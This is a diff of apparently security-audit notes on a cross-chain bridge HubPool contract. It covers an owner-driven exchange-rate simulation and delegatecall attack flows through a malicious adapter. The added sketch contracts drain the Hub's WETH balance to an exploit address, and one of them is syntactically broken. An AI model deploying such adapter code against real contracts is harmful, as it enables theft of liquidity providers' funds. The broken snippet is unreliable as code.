@@ -6,7 +6,7 @@ function haircutReserves(address l1Token, int256 haircutAmount) public onlyOwner
 }
 ```
 
-1. we add liquidity, for example `l1TokenAmount = 100000` tokens, get `lpTokenAmount = (l1TokenAmount * 1e18) / _exchangeRateCurrent(l1Token)`
+1. we add liquidity, e.g. `l1TokenAmount = 100000` tokens, get `lpTokenAmount = (l1TokenAmount * 1e18) / _exchangeRateCurrent(l1Token)` lp tokens.
 2. owner executes haircutReserves() and changes utilizedReserves
 3. we remove liquidity and get `l1Tokens = (lpTokenAmount * _exchangeRateCurrent(l1Token)) / 1e18`
 
@@ -14,7 +14,7 @@ function haircutReserves(address l1Token, int256 haircutAmount) public onlyOwner
 #### Simulation
 
 ```
-get some real params for WETH contract:
+get some onchain params for WETH contract:
 
 address lpToken = 0x28F77208728B0A45cAb24c4868334581Fe86F95B
 uint32 lastLpFeeUpdate = 1742478023
@@ -40,33 +40,34 @@ contract Simulation {
     }
 
     function removeLiquidity(uint256 lpTokenAmount) external view returns (uint256) {
-        return (lpTokenAmount * exchangeRate()) / 1e18;
+        uint256 l1TokensToReturn = (lpTokenAmount * exchangeRate()) / 1e18;
     }
 }
 
 // *** assume we have 100000 lpTokens:
 // 1. int256 utilizedReserves = 3081310457640993279566
 // 2. lpTokens = 100000
-// 3. l1Token = 109643
+// 3. l1TokensToReturn = 109643
 
 // *** increase utilizedReserves, haircutAmount < 0 -> we get more l1 tokens than deposited: 
 // 1. int256 utilizedReserves = 3081310457640993279566000
 // 2. lpTokens = 100000
-// 3. l1Token = 18185397
+// 3. l1TokensToReturn = 18185397
 
 // *** increase utilizedReserves, haircutAmount < 0 -> we get less l1 tokens than deposited: 
 // 1. int256 utilizedReserves = 3081310457640
 // 2. lpTokens = 100000
-// 3. l1Token = 91549
+// 3. l1TokensToReturn = 91549
 
 // *** increase utilizedReserves, haircutAmount < 0 -> we get less l1 tokens than deposited: 
 // *** !!! have saturation
 // 1. int256 utilizedReserves = 308131045
 // 2. lpTokens = 100000
-// 3. l1Token = 91549
+// 3. l1TokensToReturn = 91549
 ```
 
-> _updateAccumulatedLpFees(pooledToken) and _sync(l1Token) don't affect on exchangeRate, \if only haircutReserves() was called
+> _updateAccumulatedLpFees(pooledToken) and _sync(l1Token)
+> don't affect on exchangeRate, if only haircutReserves() was called
         
 
 
@@ -86,11 +87,13 @@ contract Simulation {
 Here we can withdraw all tokens: here we do adapter.delegatecall.
 
 ```
-call trace:                                who calls
-setCrossChainContracts                                 msg.sender = owner
-executeRootBundle                                      msg.sender = attacker(EOA)
-    _sendTokensToChainAndUpdatePooledTokenTrackers     msg.sender = attacker(EOA)
-        (bool success, ) = adapter.delegatecall(       msg.sender = attacker(EOA)
+// assume attacker = msg.sender
+
+call trace:                                            who calls
+setCrossChainContracts                                 msg.sender == owner
+executeRootBundle                                      msg.sender == attacker
+    _sendTokensToChainAndUpdatePooledTokenTrackers     msg.sender == attacker
+        (bool success, ) = adapter.delegatecall(       msg.sender == attacker
                     abi.encodeWithSignature(
                         "relayTokens(address,address,uint256,address)",
                         l1Token, // l1Token.
@@ -104,114 +107,133 @@ executeRootBundle                                      msg.sender = attacker(EOA
 Possible attack vector in single transaction (all liquidity is on Hub contract):
 1. set new `adapter` in setCrossChainContracts
 3. attacker calls executeRootBundle(inside we call internal function _sendTokensToChainAndUpdatePooledTokenTrackers()):
-4. in `adapter`.delegatecall (in context of hub contract):
+4. call `adapter`.delegatecall (in context of Hub contract):
 
 ```solidity
-// this function is defined in new adapter contract
-address immutable private EXPLOIT_ADDRESS
-function relayTokens(address,address,uint256,address) {
-    // here is msg.sender is still attacker
-    IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    token.transfer(EXPLOIT_ADDRESS, token.balanceOf(address(this))); // msg.sender in approve is HUB
+// Potential exploit function (this function is defined in new adapter contract)
+contract Adapter {
+    address immutable private EXPLOIT_ADDRESS;
+
+    function relayTokens(address,address,uint256,address) {
+        // msg.sender == attacker
+        IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+        // inside transfer() msg.sender == address(this), so can withdraw liquidity
+        token.transfer(EXPLOIT_ADDRESS, token.balanceOf(address(this))); // msg.sender in approve is HUB
+    }
 }
 ```
 
+### setDepositRoute (+relaySpokePoolAdminFunction)
 ```solidity
-    function executeRootBundle(
-        uint256 chainId,
-        uint256 groupIndex,
-        uint256[] memory bundleLpFees,
-        int256[] memory netSendAmounts,
-        int256[] memory runningBalances,
-        uint8 leafId,
-        address[] memory l1Tokens,
-        bytes32[] calldata proof
-    ) public nonReentrant unpaused {
-        require(getCurrentTime() > rootBundleProposal.challengePeriodEndTimestamp, "Not passed liveness");
+function setDepositRoute(
+    uint256 originChainId,
+    uint256 destinationChainId,
+    address originToken,
+    bool depositsEnabled
+) public override nonReentrant onlyOwner {
+    _relaySpokePoolAdminFunction(
+        originChainId,
+        abi.encodeWithSignature(
+            "setEnableRoute(address,uint256,bool)",
+            originToken,
+            destinationChainId,
+            depositsEnabled
+        )
+    );
+    emit SetEnableDepositRoute(originChainId, destinationChainId, originToken, depositsEnabled);
+}
 
-        // Verify the leafId in the poolRebalanceLeaf has not yet been claimed.
-        require(!MerkleLib.isClaimed1D(rootBundleProposal.claimedBitMap, leafId), "Already claimed");
 
-        // Verify the props provided generate a leaf that, along with the proof, are included in the merkle root.
-        require(
-            MerkleLib.verifyPoolRebalance(
-                rootBundleProposal.poolRebalanceRoot,
-                PoolRebalanceLeaf({
-                    chainId: chainId,
-                    groupIndex: groupIndex,
-                    bundleLpFees: bundleLpFees,
-                    netSendAmounts: netSendAmounts,
-                    runningBalances: runningBalances,
-                    leafId: leafId,
-                    l1Tokens: l1Tokens
-                }),
-                proof
-            ),
-            "Bad Proof"
-        );
-        // Grouping code that uses adapter and spokepool to avoid stack too deep warning.
-        // Get cross chain helpers for leaf's destination chain ID. This internal method will revert if either helper
-        // is set improperly.
-        (address adapter, address spokePool) = _getInitializedCrossChainContracts(chainId);
+function _relaySpokePoolAdminFunction(uint256 chainId, bytes memory functionData) internal {
+    (address adapter, address spokePool) = _getInitializedCrossChainContracts(chainId);
 
-        // Set the leafId in the claimed bitmap.
-        rootBundleProposal.claimedBitMap = MerkleLib.setClaimed1D(rootBundleProposal.claimedBitMap, leafId);
+    // Perform delegatecall to use the adapter's code with this contract's context.
 
-        // Decrement the unclaimedPoolRebalanceLeafCount.
-        --rootBundleProposal.unclaimedPoolRebalanceLeafCount;
+    // We are ok with this low-level call since the adapter address is set by the admin and we've
+    // already checked that its not the zero address.
+    // solhint-disable-next-line avoid-low-level-calls
+    (bool success, ) = adapter.delegatecall(
+        abi.encodeWithSignature(
+            "relayMessage(address,bytes)",
+            spokePool, // target. This should be the spokePool on the L2.
+            functionData
+        )
+    );
+    require(success, "delegatecall failed");
+    emit SpokePoolAdminFunctionTriggered(chainId, functionData);
+}
+```
 
-        // Relay each L1 token to destination chain.
-        // Note: if any of the keccak256(l1Tokens, chainId) combinations are not mapped to a destination token address,
-        // then this internal method will revert. In this case the admin will have to associate a destination token
-        // with each l1 token. If the destination token mapping was missing at the time of the proposal, we assume
-        // that the root bundle would have been disputed because the off-chain data worker would have been unable to
-        // determine if the relayers used the correct destination token for a given origin token.
-        _sendTokensToChainAndUpdatePooledTokenTrackers(
-            adapter,
-            spokePool,
-            chainId,
-            l1Tokens,
-            netSendAmounts,
-            bundleLpFees
-        );
+Possible attack flow (in single tx):
+1. set new `adapter` in setCrossChainContracts
+2. attacker calls setDepositRoute(inside we call internal function _relaySpokePoolAdminFunction()):
+3. call `adapter`.delegatecall (in context of Hub contract):
 
-        // Check bool used by data worker to prevent relaying redundant roots to SpokePool.
-        if (groupIndex == 0) {
-            // Relay root bundles to spoke pool on destination chain by
-            // performing delegatecall to use the adapter's code with this contract's context.
+```solidity
+// Potential exploit function (this function is defined in new adapter contract)
+contract Adapter {
+    address immutable private EXPLOIT_ADDRESS;
 
-            // We are ok with this low-level call since the adapter address is set by the admin and we've
-            // already checked that its not the zero address.
-            // solhint-disable-next-line avoid-low-level-calls
-            (bool success, ) = adapter.delegatecall(
-                abi.encodeWithSignature(
-                    "relayMessage(address,bytes)",
-                    spokePool, // target. This should be the spokePool on the L2.
-                    abi.encodeWithSignature(
-                        "relayRootBundle(bytes32,bytes32)",
-                        rootBundleProposal.relayerRefundRoot,
-                        rootBundleProposal.slowRelayRoot
-                    ) // message
-                )
-            );
-            require(success, "delegatecall failed");
-        }
-
-        // Transfer the bondAmount back to the proposer, if this the last executed leaf. Only sending this once all
-        // leaves have been executed acts to force the data worker to execute all bundles or they won't receive their bond.
-        if (rootBundleProposal.unclaimedPoolRebalanceLeafCount == 0)
-            bondToken.safeTransfer(rootBundleProposal.proposer, bondAmount);
-
-        emit RootBundleExecuted(
-            groupIndex,
-            leafId,
-            chainId,
-            l1Tokens,
-            bundleLpFees,
-            netSendAmounts,
-            runningBalances,
-            msg.sender
-        );
+    function relayMessage(address,bytes) {
+        // msg.sender == attacker
+        address selfBalance = token.balanceOf(address(this));
+        IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+        // inside transfer() msg.sender == address(this), so can withdraw liquidity
+        token.transfer(EXPLOIT_ADDRESS, token.balanceOf(selfBalance); // msg.sender in approve is HUB
     }
+}
+```
 
+### setBond
+```solidity
+interface AddressWhitelistInterface {
+    function addToWhitelist(address newElement) external;
+    function removeFromWhitelist(address newElement) external;
+    function isOnWhitelist(address newElement) external view returns (bool);
+    function getWhitelist() external view returns (address[] memory);
+}
+
+function setBond(IERC20 newBondToken, uint256 newBondAmount)
+    public
+    override
+    onlyOwner
+    noActiveRequests
+    nonReentrant
+{
+    require(newBondAmount != 0, "bond equal to final fee");
+
+    AddressWhitelistInterface addressWhitelist = AddressWhitelistInterface(
+        finder.getImplementationAddress(OracleInterfaces.CollateralWhitelist)
+    );
+    require(addressWhitelist.isOnWhitelist(address(newBondToken)), "Not on whitelist");
+
+    bondToken = newBondToken;
+    uint256 _bondAmount = newBondAmount + _getBondTokenFinalFee();
+    bondAmount = _bondAmount;
+    emit BondSet(address(newBondToken), _bondAmount);
+}
+
+```
+
+At first glance it may seem that we can change interfacesImplemented[OracleInterfaces.CollateralWhitelist] value to exploit contract, but in new contract isOnWhitelist() function should be also view (can't change blockchain state), otherwise call will be reverted (if new isOnWhitelist() function is not readable).
+
+
+```solidity
+contract Finder is Ownable {
+
+    mapping(bytes32 => address) public interfacesImplemented;
+
+    event InterfaceImplementationChanged(bytes32 indexed interfaceName, address indexed newImplementationAddress);
+
+    /**
+     * @dev Updates the address of the contract that implements `interfaceName`.
+     */
+    function changeImplementationAddress(bytes32 interfaceName, address implementationAddress)
+        external
+        onlyOwner
+    {
+        interfacesImplemented[interfaceName] = implementationAddress;
+        emit InterfaceImplementationChanged(interfaceName, implementationAddress);
+    }
+// ...
 ```
